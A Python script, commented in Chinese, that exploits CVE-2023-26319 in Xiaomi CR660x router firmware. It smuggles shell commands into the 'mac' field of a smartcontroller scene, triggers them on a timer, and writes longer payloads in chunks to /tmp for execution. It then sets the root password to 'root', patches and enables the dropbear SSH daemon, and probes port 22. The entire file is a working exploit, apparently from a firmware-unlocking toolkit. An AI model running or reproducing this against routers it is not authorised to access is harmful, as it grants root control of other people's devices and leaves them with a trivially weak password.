#!/usr/bin/env python3
# cr660x/enable_ssh_2.py — smartcontroller scene 注入通杀 (CVE-2023-26319)
#
# xmir-patcher 已验证: CR6608 1.0.96 (移动版), stok+smartcontroller 成功
#
# 用法: ./enable_ssh_2.py --stok <stok> --ip <IP>
# 输出: stdout=JSON, stderr=--debug 时日志, exit 0=成功 1=失败

import argparse
import datetime
import json
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_IP = "192.168.31.1"
MAX_CMD_LEN = 100 - 1 - len("/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit")
STEP_NAME = "enable_ssh_2"
DEBUG = False
SPECIAL_CHARS = ['"', "\\", "`", "$", "\n"]


def log(msg):
    if DEBUG:
        print(f"[{STEP_NAME}] {msg}", file=sys.stderr)


def emit_ok(data):
    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data}, ensure_ascii=False))


def emit_err(error, reason=""):
    out = {"ok": False, "step": STEP_NAME, "error": error, "recoverable": True}
    if reason:
        out["reason"] = reason
    print(json.dumps(out, ensure_ascii=False))


def http_get(url, timeout=30):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8"))


def http_post(url, data, timeout=30):
    """POST form-urlencoded, 返回 (status_int, text)。"""
    post_data = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(url, data=post_data)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.getcode(), r.read().decode("utf-8")


def smart_post(stok, ip, payload, timeout=15):
    """POST request_smartcontroller, 返回响应文本。"""
    url = f"http://{ip}/cgi-bin/luci/;stok={stok}/api/xqsmarthome/request_smartcontroller"
    payload_str = json.dumps(payload, separators=(",", ":"))
    code, text = http_post(url, {"payload": payload_str}, timeout)
    return code, text


def exec_tiny_cmd(stok, ip, cmd, hhmm, sep):
    """注入一条短命令 (≤MAX_CMD_LEN) 走 scene 三步曲: 注册→触发→删除。"""
    if len(cmd) > MAX_CMD_LEN:
        raise RuntimeError(f"cmd 超长 ({len(cmd)}>{MAX_CMD_LEN}): {cmd}")
    name = f"it3_{hhmm.replace(':', '_')}"

    scene = {
        "command": "scene_setting",
        "name": name,
        "action_list": [{
            "thirdParty": "xmrouter",
            "delay": 2,
            "type": "wan_block",
            "payload": {"command": "wan_block", "mac": sep + cmd + sep},
        }],
        "launch": {"timer": {"time": hhmm, "repeat": "0", "enabled": True}},
    }
    code, text = smart_post(stok, ip, scene)
    if code == 500 or "Internal Server Error" in text:
        raise RuntimeError(f"scene_setting 500 (hackCheck 过高或 smartcontroller 堵了): {text[:200]}")
    try:
        d = json.loads(text)
    except json.JSONDecodeError:
        raise RuntimeError(f"scene_setting 非 JSON: {text[:200]}")
    if d.get("code") != 0:
        raise RuntimeError(f"scene_setting 失败: {d}")
    scene_id = d.get("id")
    if not scene_id:
        raise RuntimeError(f"scene_setting 返回无 id: {d}")

    # 触发
    trigger = {"command": "scene_start_by_crontab", "time": hhmm, "week": 0}
    trigger_timeout = False
    try:
        ct, ct_text = smart_post(stok, ip, trigger)
        trigger_timeout = (ct == 504) or ("504 Gateway Time-out" in ct_text)
    except urllib.error.HTTPError as e:
        if e.code == 504:
            trigger_timeout = True
        else:
            raise
    if trigger_timeout:
        time.sleep(2)

    # 删除
    try:
        smart_post(stok, ip, {"command": "scene_delete", "id": scene_id})
    except Exception:
        pass


def exec_cmd(stok, ip, command, hhmm, sep, fn="/tmp/e"):
    """任意长命令: 分块 echo 写入 /tmp/e → chmod +x → sh。"""
    command = command.replace(" ; ", " ; " if sep == ";" else "\n")
    template = 'echo -n{spec} "{txt}"{amode}{fn}'
    flen = len(template.format(spec="", txt="", amode="", fn=fn))

    chunks = []
    buf = ""
    for ch in command:
        if len(buf) >= MAX_CMD_LEN - flen - len(">>"):
            chunks.append(buf)
            buf = ""
        if ch in SPECIAL_CHARS:
            if buf:
                chunks.append(buf)
            chunks.append(ch)
            buf = ""
            continue
        buf += ch
    if buf:
        chunks.append(buf)

    next_hhmm = hhmm
    for i, chunk in enumerate(chunks):
        amode = ">" if i == 0 else ">>"
        spec = ""
        txt = chunk
        if len(chunk) == 1 and chunk in SPECIAL_CHARS:
            spec = "e"
            if chunk == "\n":
                txt = "\\n"
            elif chunk == '"':
                txt = '\\"'
            else:
                txt = f"\\{chunk}"
        cmd = template.format(spec=spec, txt=txt, amode=amode, fn=fn)
        exec_tiny_cmd(stok, ip, cmd, next_hhmm, sep)
        next_hhmm = _inc_hhmm(next_hhmm)

    exec_tiny_cmd(stok, ip, f"chmod +x {fn}", next_hhmm, sep)
    next_hhmm = _inc_hhmm(next_hhmm)
    exec_tiny_cmd(stok, ip, f"sh {fn}", next_hhmm, sep)


def _inc_hhmm(hhmm):
    h, m = map(int, hhmm.split(":"))
    m += 1
    if m >= 60:
        m = 0
        h += 1
    if h >= 24:
        h = 0
    return f"{h}:{m}"


def probe_ssh(host, port=22, timeout=5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def main():
    global DEBUG
    p = argparse.ArgumentParser(description=f"{STEP_NAME}: smartcontroller scene 启用 SSH")
    p.add_argument("--stok", required=True)
    p.add_argument("--ip", default=DEFAULT_IP)
    p.add_argument("--timeout", type=int, default=15)
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()
    DEBUG = args.debug

    stok = args.stok
    ip = args.ip
    base_url = f"http://{ip}"

    try:
        # 1. 读系统时间 (做热身)
        log("读系统时间, 热身 smartcontroller...")
        info = http_get(f"{base_url}/cgi-bin/luci/api/xqsystem/init_info", 10)
        log(f"model={info.get('model','?')} inited={info.get('inited','?')}")
        time_data = http_get(f"{base_url}/cgi-bin/luci/;stok={stok}/api/misystem/sys_time", 10)
        dst = time_data.get("time", time_data)
        if "'" in dst.get("timezone", "").replace("\\'", "") or ";" in dst.get("timezone", ""):
            dst["timezone"] = "GMT0"
        timezone = dst.get("timezone", "GMT0")
        # 热身: set_sys_time 触发 /tmp/ntp.status
        log("热身...")
        sst = {"time": f"{dst['year']}-{dst['month']}-{dst['day']} {dst['hour']}:{dst['min']}:{dst['sec']}",
               "timezone": timezone}
        http_post(
            f"{base_url}/cgi-bin/luci/;stok={stok}/api/misystem/set_sys_time",
            sst, 10
        )
        time.sleep(3.1)
        sep = ";"

        # 2. 32s 激活循环: date -s 2033
        log(f"等待 smartcontroller 激活 (最长 32s)...")
        hhmm = f"{dst.get('hour', 1) % 24}:{dst.get('min', 0) % 60}"
        sc_ok = False
        start = time.monotonic()
        while time.monotonic() - start <= 32:
            time.sleep(2)
            try:
                exec_tiny_cmd(stok, ip, "date -s 203301020304", hhmm, sep)
                hhmm = _inc_hhmm(hhmm)
            except Exception as e:
                log(f"tiny_cmd: {e} (重试)")
                continue
            try:
                dxt = http_get(f"{base_url}/cgi-bin/luci/;stok={stok}/api/misystem/sys_time", 10).get("time", {})
            except Exception:
                continue
            if dxt.get("year") == 2033 and dxt.get("month") == 1 and dxt.get("day") == 2:
                log("smartcontroller 链路验证成功! 时间已变 2033-01-02")
                sc_ok = True
                break

        if not sc_ok:
            # 恢复时间
            try:
                http_post(f"{base_url}/cgi-bin/luci/;stok={stok}/api/misystem/set_sys_time", sst, 5)
            except Exception:
                pass
            raise RuntimeError("smartcontroller 32s 内未激活")

        # 恢复时间
        log("恢复系统时间...")
        time.sleep(1)
        http_post(f"{base_url}/cgi-bin/luci/;stok={stok}/api/misystem/set_sys_time", sst, 10)
        time.sleep(3)

        # 3. SSH 启用序列
        log("nvram ssh_en=1 ...")
        exec_tiny_cmd(stok, ip, "nvram set ssh_en=1", hhmm, sep); hhmm = _inc_hhmm(hhmm)
        exec_tiny_cmd(stok, ip, "nvram commit", hhmm, sep); hhmm = _inc_hhmm(hhmm)
        log("设置 root 密码 root ...")
        exec_tiny_cmd(stok, ip, "echo root >/tmp/x", hhmm, sep); hhmm = _inc_hhmm(hhmm)
        exec_tiny_cmd(stok, ip, "echo root >>/tmp/x", hhmm, sep); hhmm = _inc_hhmm(hhmm)
        exec_tiny_cmd(stok, ip, "passwd root </tmp/x", hhmm, sep); hhmm = _inc_hhmm(hhmm)
        log("解除 dropbear release 检查 ...")
        exec_cmd(stok, ip, "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear", hhmm, sep)
        log("启用 dropbear ...")
        exec_cmd(stok, ip, "/etc/init.d/dropbear enable", hhmm, sep)
        log("重启 dropbear ...")
        exec_cmd(stok, ip, "/etc/init.d/dropbear restart", hhmm, sep)

        # 4. TCP 探测 22 端口
        log(f"探测 TCP {ip}:22 ...")
        for i in range(11):
            if probe_ssh(ip, 22):
                log("SSH 已启用!")
                emit_ok({"ip": ip, "ssh_port": 22})
                return 0
            if i < 10:
                time.sleep(3)
        raise RuntimeError("SSH 端口 22 在 ~33s 内未打开")

    except RuntimeError as e:
        emit_err(str(e), reason="ssh_failed")
        return 1
    except Exception as e:
        emit_err(str(e), reason="unknown")
        return 1


if __name__ == "__main__":
    sys.exit(main())
